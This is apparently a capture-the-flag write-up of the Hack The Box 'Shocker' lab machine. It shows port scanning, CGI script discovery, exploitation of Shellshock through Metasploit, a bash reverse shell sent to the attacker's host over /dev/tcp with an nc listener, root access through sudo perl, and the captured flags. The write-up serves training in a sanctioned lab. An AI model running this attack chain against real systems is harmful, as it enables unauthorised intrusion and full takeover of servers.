![[Pasted image 20210731161938.png]]

Starting with nmap:
```
% sudo nmap -p- --min-rate 1000 -v -oA logs/tcp-simple $IP  -Pn -v
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-31 16:21 AEST
Initiating Parallel DNS resolution of 1 host. at 16:21
Completed Parallel DNS resolution of 1 host. at 16:21, 0.00s elapsed
Initiating SYN Stealth Scan at 16:21
Scanning 10.10.10.56 [65535 ports]
Discovered open port 80/tcp on 10.10.10.56
Discovered open port 2222/tcp on 10.10.10.56
Completed SYN Stealth Scan at 16:21, 14.69s elapsed (65535 total ports)
Nmap scan report for 10.10.10.56
Host is up, received user-set (0.057s latency).
Scanned at 2021-07-31 16:21:17 AEST for 15s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack ttl 63
2222/tcp open  EtherNetIP-1 syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.87 seconds
           Raw packets sent: 65684 (2.890MB) | Rcvd: 65535 (2.621MB)

```

Script scan done after:
```
% nmap -p `cat logs/tcp-simple.nmap | grep open | cut -d/ -f1 | tr "\n" "," | sed "s/,$//"` -sC -sV -Pn -oA logs/nmap-tcpscripts $IP
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-31 16:24 AEST
Nmap scan report for 10.10.10.56
Host is up (0.010s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.51 seconds
```

Website on port 80:

![[Pasted image 20210731162303.png]]

```
% exiftool bug.jpg
ExifTool Version Number         : 12.10
File Name                       : bug.jpg
Directory                       : .
File Size                       : 36 kB
File Modification Date/Time     : 2014:09:26 04:16:14+10:00
File Access Date/Time           : 2021:07:31 16:22:06+10:00
File Inode Change Date/Time     : 2021:07:31 16:22:02+10:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Comment                         : CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 90.
Image Width                     : 820
Image Height                    : 420
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 820x420
Megapixels                      : 0.344
```

Ran ffuf and found http://10.10.10.56/cgi-bin/user.sh which returns the following:

```
% curl http://10.10.10.56/cgi-bin/user.sh
Content-Type: text/plain

Just an uptime test script

02:46:27 up 26 min,  0 users,  load average: 0.68, 1.14, 0.79
```

Based on the name, file and information returns, seems like a shellshock exploit so lets try that.

We can test that it is using nmap:
```
% nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 10.10.10.56
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-31 16:51 AEST
Nmap scan report for 10.10.10.56
Host is up (0.010s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-shellshock:
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|
|     Disclosure date: 2014-09-24
|     Exploit results:
|       <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
|   <html><head>
|   <title>500 Internal Server Error</title>
|   </head><body>
|   <h1>Internal Server Error</h1>
|   <p>The server encountered an internal error or
|   misconfiguration and was unable to complete
|   your request.</p>
|   <p>Please contact the server administrator at
|    webmaster@localhost to inform them of the time this error occurred,
|    and the actions you performed just before this error.</p>
|   <p>More information about this error may be available
|   in the server error log.</p>
|   <hr>
|   <address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80</address>
|   </body></html>
|
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|       http://seclists.org/oss-sec/2014/q3/685
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.98 seconds
```

Based on the nmap script it appears to be exploitable:
```
State: VULNERABLE (Exploitable)
```

Metasploit has a module to expoit it and we can use that to verify it and get a reverse shell:
```
msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > options

Module options (auxiliary/scanner/http/apache_mod_cgi_bash_env):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   CMD        /usr/bin/id      yes       Command to run (absolute paths required)
   CVE        CVE-2014-6271    yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
   HEADER     User-Agent       yes       HTTP header to use
   METHOD     GET              yes       HTTP method to use
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI                   yes       Path to CGI script
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host

msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > setg RHOSTS 10.10.10.56
RHOSTS => 10.10.10.56
msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > setg TARGETURI /cgi-bin/user.sh
TARGETURI => /cgi-bin/user.sh
msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > check
[+] 10.10.10.56:80 - The target is vulnerable.
msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > run

[+] uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

Using this exploit to get a reverse shell:
```
msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > set CMD "/bin/bash -i >& /dev/tcp/10.10.14.23/80 0>&1"
CMD => /bin/bash -i >& /dev/tcp/10.10.14.23/80 0>&1
msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > run

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

and the listener catches the shell:
```
% sudo nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.56] 46292
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ ls
ls
user.sh
shelly@Shocker:/usr/lib/cgi-bin$ whoami && ip a
whoami && ip a
shelly
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:b9:b8:71 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.56/24 brd 10.10.10.255 scope global ens33
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:b871/64 scope global mngtmpaddr dynamic
       valid_lft 86171sec preferred_lft 14171sec
    inet6 fe80::250:56ff:feb9:b871/64 scope link
       valid_lft forever preferred_lft forever
```

user flag:
```
shelly@Shocker:/home/shelly$ cat user.txt
cat user.txt
445c7086252b2fb8ba66b9b9476d9482
```

Privesc is trivial. `sudo -l` shows you can run perl as root: 
```
% sudo nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.56] 46476
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
shelly@Shocker:/usr/lib/cgi-bin$ sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/perl -e 'exec "/bin/sh";'
cd ~
whoami && cat root.txt
root
66572642f5e8a34c3bf6ce2d227ea45e
```